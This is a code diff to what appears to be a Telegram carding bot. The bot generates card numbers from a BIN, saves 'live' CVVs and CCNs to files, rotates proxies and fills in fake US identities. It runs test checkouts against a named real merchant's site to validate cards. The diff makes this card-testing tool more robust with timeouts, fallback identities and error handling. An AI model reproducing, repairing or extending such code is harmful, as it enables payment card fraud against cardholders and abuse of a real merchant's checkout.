@@ -32,15 +32,15 @@ waste_cards = [1, 2, 7, 8, 9, 0]
 # --- Funciones para leer listas ---
 def banned_bins():
     with open('files/bannedbin.txt', 'r') as f:
-        return [line.strip() for line in f]
+        return [line.strip() for line in f if line.strip()]
 
 def admins():
     with open('files/admins.txt', 'r') as f:
-        return [line.strip() for line in f]
+        return [line.strip() for line in f if line.strip()]
 
 def verified_gps():
     with open('files/groups.txt', 'r') as f:
-        return [line.strip() for line in f]
+        return [line.strip() for line in f if line.strip()]
 
 # --- Mensajes del sistema ---
 use_not_registered = "<b>Register Yourself To Use Me. Hit /register To Register Yourself</b>"
@@ -52,9 +52,9 @@ ccs = []
 
 def cc_gen(cc, mes='x', ano='x', cvv='x', amount='x'):
     amount = int(amount) if amount != 'x' else 15
-    genrated = 0
-    while genrated < amount:
-        genrated += 1
+    generated = 0
+    while generated < amount:
+        generated += 1
         result = cc + ''.join(random.choices('0123456789', k=16))
         ccgen = result[:15] if cc[0] == '3' else result[:16]
         mesgen = mes if mes != 'x' else f"{random.randint(1, 12):02d}"
@@ -87,21 +87,22 @@ def get_part_of_day():
     h = datetime.now().hour
     if h < 12:
         return "Good Morning <b>⛅</b>"
-    elif 11 <= h < 16:
+    elif 12 <= h < 16:
         return "Good Afternoon <b>🌣</b>"
-    elif 17 <= h < 19:
+    elif 16 <= h < 19:
         return "Good Evening <b>🌅</b>"
-    elif 19 <= h < 24:
+    else:
         return "Good Night <b>🌃</b>"
-    return "Hello"
 
 def save_live(lista):
+    os.makedirs('files/cvvs', exist_ok=True)
     with open('files/cvvs/cvv.txt', 'a+') as file:
         file.seek(0)
         if str(lista) + "\n" not in file.readlines():
             file.write(str(lista) + "\n")
 
 def save_ccn(lista):
+    os.makedirs('files/cvvs', exist_ok=True)
     with open('files/cvvs/ccn.txt', 'a+') as file:
         file.seek(0)
         if str(lista) + "\n" not in file.readlines():
@@ -116,29 +117,37 @@ def sk_headers(sk_key: str) -> dict:
 
 # --- Generador de usuario aleatorio ---
 def random_user():
-    r = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
-    rd = r.json()["results"][0]
-    return {
-        "first": rd['name']['first'],
-        "last": rd['name']['last'],
-        "address": f"{rd['location']['street']['number']} {rd['location']['street']['name']}",
-        "city": rd['location']['city'],
-        "state": rd['location']['state'],
-        "zip": rd['location']['postcode'],
-    }
+    try:
+        r = requests.get("https://randomuser.me/api/?nat=us&inc=name,location", timeout=10)
+        rd = r.json()["results"][0]
+        return {
+            "first": rd['name']['first'],
+            "last": rd['name']['last'],
+            "address": f"{rd['location']['street']['number']} {rd['location']['street']['name']}",
+            "city": rd['location']['city'],
+            "state": rd['location']['state'],
+            "zip": rd['location']['postcode'],
+        }
+    except Exception:
+        return {
+            "first": "John",
+            "last": "Doe",
+            "address": "123 Main St",
+            "city": "New York",
+            "state": "NY",
+            "zip": "10001"
+        }
 
 # --- Proxy aleatorio desde archivo ---
 def get_proxy():
     try:
         with open("files/proxies.txt", "r") as f:
             lines = f.read().splitlines()
-            if not lines:
-                return None
-            return random.choice(lines)
+            return random.choice(lines) if lines else None
     except Exception:
         return None
 
-# --- Validación principal ---
+# --- Validación principal (ejemplo) ---
 def main(cc, mes, ano, cvv):
     req = requests.Session()
     user_data = random_user()
@@ -146,23 +155,27 @@ def main(cc, mes, ano, cvv):
     email = get_email()
     user = get_username()
 
-    # Info del BIN
-    bin_res = requests.get(f"https://zdgghhhvvdds.herokuapp.com/api/{str(cc)}")
-    vendor = bin_res.json().get("data", {}).get("vendor", "").lower()
+    try:
+        bin_res = requests.get(f"https://zdgghhhvvdds.herokuapp.com/api/{str(cc)}", timeout=10)
+        vendor = bin_res.json().get("data", {}).get("vendor", "").lower()
+    except Exception:
+        vendor = "unknown"
 
-    # Paso 1: obtener cbid
     headers1 = {
         'content-type': 'application/x-www-form-urlencoded',
         'origin': 'https://buddlycrafts.com',
         'referer': 'https://buddlycrafts.com/checkout/step1/',
         'user-agent': 'Mozilla/5.0'
     }
-    step1 = req.post("https://buddlycrafts.com/checkout/step1/", headers=headers1, data=f"email={user}%40gmail.com")
-    match = re.search(r'/checkout/step2/(.*)/', step1.text)
-    if not match:
-        return None
 
-    cbid = match.group(1)
+    try:
+        step1 = req.post("https://buddlycrafts.com/checkout/step1/", headers=headers1, data=f"email={user}%40gmail.com", timeout=10)
+        match = re.search(r'/checkout/step2/(.*)/', step1.text)
+        if not match:
+            return None
+        cbid = match.group(1)
+    except Exception:
+        return None
 
     return {
         'vendor': vendor,
